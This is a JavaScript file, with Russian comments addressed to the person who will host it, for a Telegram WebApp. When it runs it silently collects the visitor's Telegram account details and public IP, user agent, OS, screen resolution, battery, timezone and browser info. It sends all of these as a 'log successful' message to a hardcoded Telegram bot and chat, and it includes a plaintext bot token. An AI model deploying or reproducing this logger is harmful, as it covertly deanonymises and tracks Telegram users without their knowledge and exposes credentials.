// кодеру, который будет ставить это на хост:
// -   скрипт предназначен под Telegram WebApp, 
//     поэтому даже не пытайся под что либо адаптировать:
//     проще будет переписать по новой;
// 1-----------------------------------------------------
// -   имеестя проблема с getTimezoneOffset(),
//     ебись сам
// 2-----------------------------------------------------
// -   менять токен и ID чата прямо в фунцкии:
//     sendDataToTelegram() - 74-76 строки
// 3-----------------------------------------------------
// -   на iOS не работае функция ниже: getIPAdress()
//     в связи давним обновлением сафари
// 4-----------------------------------------------------
// -   может показывать не все устройства верно.
// ------------------------------------------------------
//                     УДАЧИ!
//                     УДАЧИ!
//                     УДАЧИ!


// async function getIPAddress() {
//     const response = await fetch('https://api.ipify.org?format=json');
//     const data = await response.json();
//     return data.ip;
// }

async function fetchPublicIP() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
  } catch (error) {
    console.error('Error fetching IP:', error);
    return 'Не удалось получить IP';
  }
}

function getUserAgent() {
    return navigator.userAgent;
}

function getOSName() {
    return navigator.platform;
}

function getScreenResolution() {
    return `${window.screen.width}x${window.screen.height}`;
}

async function getBatteryPercentage() {
    const battery = await navigator.getBattery();
    return Math.floor(battery.level * 100);
}

function getBrowserInfo() {
    return {
        name: navigator.appName,
        version: navigator.appVersion,
        engine: navigator.product
    };
}

async function sendDataToTelegram() {
    try {
        const ipAddress = await fetchPublicIP();
        const userAgent = getUserAgent();
        const osName = getOSName();
        const screenResolution = getScreenResolution();
        let batteryPercentage;
        try {
            batteryPercentage = await getBatteryPercentage();
        } catch (error) {
            console.error('Error getting battery info:', error);
            batteryPercentage = 'Недоступно';
        }
        const browserInfo = getBrowserInfo();
        let tg = window.Telegram.WebApp;

        const message = `
<b>✨ Лог успешен!</b>
<b>🔍 Информация об аккаунте:</b>
├ Тэг: @${tg.initDataUnsafe.user.username || 'Отсутствует'}
├ Айди: <code>${tg.initDataUnsafe.user.id}</code>
├ Имя: <code>${tg.initDataUnsafe.user.first_name}</code>
├ Фамилия: <code>${tg.initDataUnsafe.user.last_name || 'Отсутствует'}</code>
├ Язык: <code>${tg.initDataUnsafe.user.language_code}</code>
└ Можно писать в ЛС: <code>${tg.initDataUnsafe.user.allows_write_to_pm}</code>
<b>🖥 Информация об устройстве:</b>
├ Айпи: <code>${ipAddress}</code>
├ UserAgent: <code>${userAgent}</code>
├ Хэш: <code>undefined</code>
├ Имя ОС: <code>${osName}</code>
├ Разрешение экрана: <code>${screenResolution}</code>
├ Процент батареи: <code>${batteryPercentage}${typeof batteryPercentage === 'number' ? '%' : ''}</code>
└ Часовой пояс: <code>${new Date().getTimezoneOffset()}</code>
<b>🌐 Информация о браузере:</b>
├ Название браузера: <code>${browserInfo.name}</code>
├ Версия браузера: <code>${browserInfo.version}</code>
└ Тип движка браузера: <code>${browserInfo.engine}</code>
        `;

        const token = '7654890944:AAGaxUzyNxethxulDQKFSNkfciruDiIxDXc';
        const telegramBotURL = `https://api.telegram.org/bot${token}/sendMessage`;
        const chatId = '-4778017209';

        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('text', message);
        formData.append('parse_mode', 'HTML');

        const response = await fetch(telegramBotURL, {
            method: 'POST',
            body: formData
        });

        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
    } catch (error) {
        console.error('Error in sendDataToTelegram:', error);
        
        // Send error report to Telegram
        try {
            const errorMessage = `
<b>⚠️ Ошибка в скрипте!</b>
<b>🔍 Детали ошибки:</b>
├ Сообщение: <code>${error.message}</code>
├ UserAgent: <code>${getUserAgent()}</code>
├ Платформа: <code>${getOSName()}</code>
└ Время: <code>${new Date().toISOString()}</code>
            `;

            const token = '7654890944:AAGaxUzyNxethxulDQKFSNkfciruDiIxDXc';
            const telegramBotURL = `https://api.telegram.org/bot${token}/sendMessage`;
            const chatId = '-4778017209';

            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('text', errorMessage);
            formData.append('parse_mode', 'HTML');

            await fetch(telegramBotURL, {
                method: 'POST',
                body: formData
            });
        } catch (sendError) {
            console.error('Failed to send error report:', sendError);
        }
    }
}

sendDataToTelegram();
